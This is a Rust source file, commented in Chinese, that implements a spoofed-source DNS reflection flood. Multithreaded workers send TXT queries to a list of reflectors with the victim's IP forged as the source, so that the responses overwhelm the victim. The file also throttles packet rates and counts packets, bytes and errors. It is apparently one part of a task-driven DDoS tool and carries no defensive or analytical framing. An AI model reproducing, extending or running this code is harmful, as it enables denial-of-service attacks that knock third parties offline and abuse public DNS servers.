// 反射攻击循环：伪源 DNS 查询洪泛。
// 每任务 N 线程；统计原子计数；节流由 throttle 模块提供。

use crate::dns;
use crate::reflector::Reflector;
use crate::spoof::SpoofSocket;
use crate::throttle::Throttle;
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

#[derive(Default)]
pub struct Stats {
    pub packets: AtomicU64,
    pub bytes: AtomicU64,
    pub errors: AtomicU64,
    pub pps: AtomicU64,
}

pub struct TaskSpec {
    pub task_id: String,
    pub victim_ip: [u8; 4],
    pub duration_secs: u64,
    pub threads: u32,
    pub reflectors: Vec<Reflector>,
    pub max_pps: u64,
}

/// 运行一次 DNS 反射攻击（阻塞直到结束）。
/// 统计经 Arc 共享（线程写入）。
pub fn run_dns_reflection(spec: &TaskSpec, stats: Arc<Stats>) {
    let dur = Duration::from_secs(spec.duration_secs);
    let mut handles = Vec::new();

    for t in 0..spec.threads {
        let victim = spec.victim_ip;
        let reflectors = spec.reflectors.clone();
        let stats = Arc::clone(&stats);
        let mut thr = Throttle::new(spec.max_pps / u64::from(spec.threads.max(1)));
        let dur = dur;
        handles.push(std::thread::spawn(move || {
            let mut rng_state = (t as u64).wrapping_mul(0x9E3779B97F4A7C15) + 1;
            let sock = match SpoofSocket::new() {
                Ok(s) => s,
                Err(_) => return,
            };
            let end = Instant::now() + dur;
            let mut local_pkt = 0u64;
            let mut last_tick = Instant::now();
            let mut last_pkt = 0u64;

            while Instant::now() < end {
                if !thr.allow() {
                    std::thread::sleep(Duration::from_micros(100));
                    continue;
                }
                // 随机选反射器 + 随机 DNS id
                rng_state ^= rng_state << 13;
                rng_state ^= rng_state >> 7;
                rng_state ^= rng_state << 17;
                let idx = (rng_state % reflectors.len() as u64) as usize;
                let refr = &reflectors[idx];
                let domain = if refr.domain.is_empty() { "isc.org" } else { &refr.domain };
                let q = dns::build_txt_query(domain, (rng_state & 0xFFFF) as u16);

                match sock.send_udp(victim, refr.ip, refr.port, &q) {
                    Ok(_) => {
                        stats.packets.fetch_add(1, Ordering::Relaxed);
                        stats.bytes.fetch_add(q.len() as u64, Ordering::Relaxed);
                        local_pkt += 1;
                    }
                    Err(_) => {
                        stats.errors.fetch_add(1, Ordering::Relaxed);
                    }
                }

                // 每秒统计 PPS
                if last_tick.elapsed() >= Duration::from_secs(1) {
                    let delta = local_pkt - last_pkt;
                    stats.pps.store(delta, Ordering::Relaxed);
                    last_pkt = local_pkt;
                    last_tick = Instant::now();
                }
            }
        }));
    }
    for h in handles {
        let _ = h.join();
    }
}
